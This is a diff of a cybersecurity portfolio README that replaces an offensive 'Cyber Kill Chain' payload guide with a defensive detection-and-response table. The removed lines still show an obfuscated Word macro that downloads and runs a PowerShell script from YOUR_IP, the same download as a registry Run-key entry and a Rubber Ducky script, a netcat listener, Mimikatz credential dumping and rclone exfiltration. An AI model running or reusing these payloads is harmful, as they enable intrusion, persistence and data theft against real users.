@@ -1,89 +1,40 @@
-# Cyber Kill Chain – Operation: PWN EVERYTHING
-*Presented by: Agent 1337 aka Ainny1, InfoSec's slickest field operative*
+# 🛡️ Cyber Kill Chain — Defensive Detection & Response Lab
 
-_Includes working payload code samples for lab use._
+A cybersecurity portfolio lab that maps the **seven stages of the Cyber Kill Chain** to defender-visible signals, investigation questions, and mitigations. This project is a **training and detection-design reference**; examples are illustrative and do not represent validated detections or an operational SOC.
 
+## 🔎 Defender workflow
 
-## 1. Reconnaissance – “The Creeper’s Crawl”
+```mermaid
+flowchart LR
+  A["Threat hypothesis"] --> B["Relevant telemetry"]
+  B --> C["Detection / correlation"]
+  C --> D["Analyst triage"]
+  D --> E["Containment & hardening"]
+  E --> F["Safe validation"]
+  F -. "Tune" .-> C
+```
 
-| Field | Details |
-|-------|---------|
-| Mission | Know thy target. |
-| Tactics | - Passive: Google dorking, LinkedIn stalking, Shodan scans<br>- Active: Phishing domain lookups, WHOIS scraping |
-| Payloads | N/A (no code dropped here — just info slurped) |
-| Tip | Try using “theHarvester” and see what emails and domains fall out like candy from a piñata. |
+## 🧩 Kill Chain to defensive coverage
 
-## 2. Weaponization – “Crafting the Digital Dagger”
+| Kill Chain phase | Defender-visible clues | Defensive response | Related MITRE ATT&CK tactics (illustrative) |
+| --- | --- | --- | --- |
+| Reconnaissance | Unusual scanning patterns, repeated requests | Review network telemetry and exposed services | Reconnaissance (TA0043) |
+| Weaponization | Often occurs outside monitored systems; limited direct visibility | Threat intelligence and artifact analysis | Resource Development (TA0042), where applicable |
+| Delivery | Suspicious email attachments, web downloads | Email/web filtering and user reporting | Initial Access (TA0001) |
+| Exploitation | Unusual application child processes, exploit-related alerts | Patch, isolate affected hosts, investigate process tree | Execution (TA0002) |
+| Installation | New persistence entries or unexpected services | EDR investigation, baseline comparison | Persistence (TA0003) |
+| Command & Control | Periodic outbound connections, unusual DNS behavior | Correlate proxy/DNS/network and endpoint data | Command and Control (TA0011) |
+| Actions on Objectives | Unexpected data movement or file changes | DLP, access review, containment | Exfiltration (TA0010), Impact (TA0040) |
 
-| Field | Details |
-|-------|---------|
-| Mission | Combine malware with a delivery vehicle. |
-| Tactics | - Malicious PDFs/Excels<br>- Bind reverse shell to installer |
-| Payloads | - Meterpreter in a CV-laced PDF<br>- Emotet in invoice-themed Word doc<br>- PowerShell Empire script<br>It’s like putting a snake in a birthday cake. Only less festive. And more... root access. |
-| Sample Code | Sub AutoOpen()<br>    Dim p1 As String, p2 As String, p3 As String<br>    p1 = "pow"<br>    p2 = "ers"<br>    p3 = "hell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"<br>    Dim fullCmd As String<br>    fullCmd = p1 & p2 & p3<br>    Shell fullCmd, vbHide<br>End Sub |
+**Mapping note:** The Cyber Kill Chain and MITRE ATT&CK are different models; this table provides approximate associations, not a one-to-one equivalence.
 
-## 3. Delivery – “The Trojan Horse Uber Eats Edition”
+## 🧪 Safe lab validation
 
-| Field | Details |
-|-------|---------|
-| Mission | Get the payload to the victim. |
-| Tactics | - Phishing emails<br>- Drive-by downloads<br>- USB drops |
-| Payloads | - Malicious login links<br>- MalDoc macro<br>- Rubber Ducky USB scripts |
-| Tip | Can you spot the phishing email before HR opens it? |
+Practice with **synthetic data or benign actions on systems you own**. See the [SOC investigation playbook](docs/soc-investigation-playbook.md) for a sample alert-triage workflow, evidence template, and detection limitations.
 
-## 4. Exploitation – “The Big Bang”
+## 📌 Portfolio status
 
-| Field | Details |
-|-------|---------|
-| Mission | Trigger the payload to breach the system. |
-| Tactics | - Macros<br>- Zero-day exploits<br>- JavaScript payloads |
-| Payloads | - CVE-2021-40444<br>- Log4Shell<br>- Cobalt Strike beacon |
-| Tip | User: “Why is my screen flickering?”<br>Attacker: “That’s just... your new dark mode.” |
+- **Documented:** Kill Chain stages, example defensive telemetry, investigation workflow, and response ideas.
+- **Not yet demonstrated:** Live telemetry ingestion, operational alerts, detection accuracy, and incident-response outcomes.
 
-## 5. Installation – “Staying for Dinner”
-
-| Field | Details |
-|-------|---------|
-| Mission | Set up shop. |
-| Tactics | - Backdoors<br>- Registry run keys<br>- RATs |
-| Payloads | - NanoCore<br>- Cobalt Strike<br>- Encoded PowerShell in scheduled task |
-| Tip | Always check your startup programs. |
-| Sample Code | Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')" |
-
-## 6. Command and Control (C2) – “Hello from the Other Side”
-
-| Field | Details |
-|-------|---------|
-| Mission | Maintain remote access and issue commands. |
-| Tactics | - HTTPS<br>- DNS tunneling<br>- Cloud-based C2 |
-| Payloads | - Metasploit beacon<br>- Sliver C2<br>- Discord bot |
-| Tip | Try setting up a simulated C2 in a lab. |
-| Sample Code | # Netcat listener<br>nc -lvnp 443<br><br># Python HTTP server<br>python3 -m http.server 80 |
-
-## 7. Actions on Objectives – “Data, Gold, and Glory”
-
-| Field | Details |
-|-------|---------|
-| Mission | Exfiltrate, destroy, encrypt, or spy. |
-| Tactics | - Data exfil<br>- Ransomware<br>- Credential harvesting |
-| Payloads | - Rclone<br>- LockBit/BlackCat<br>- Mimikatz |
-| Tip | If you hear ‘your files have been encrypted,’ the party’s over. |
-| Sample Code | # Mimikatz<br>sekurlsa::logonpasswords<br><br># Rclone exfil<br>rclone copy C:\Users\victim\Documents remote:loot --config rclone.conf |
-
-## Bonus Level: DEFENSE MODE – Your Counterplay
-
-| Field | Details |
-|-------|---------|
-| Defense Tactics | Recon: Monitor open-source mentions<br>Delivery: Email filtering + awareness<br>Exploit/Install: EDR + patching<br>C2: Detect beaconing patterns<br>Objectives: DLP, SIEM alerts, segmentation |
-
-## Bonus Payload – Rubber Ducky Ninja Moves
-
-| Field | Details |
-|-------|---------|
-| Ducky Script | DELAY 1000<br>GUI r<br>DELAY 500<br>STRING powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"<br>ENTER |
-| shell.ps1 | Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')" |
-
-
-
-
-
+This repository deliberately focuses on **defensive understanding** rather than executable payloads, credential theft, persistence, or data exfiltration. Never test third-party systems without explicit authorization.
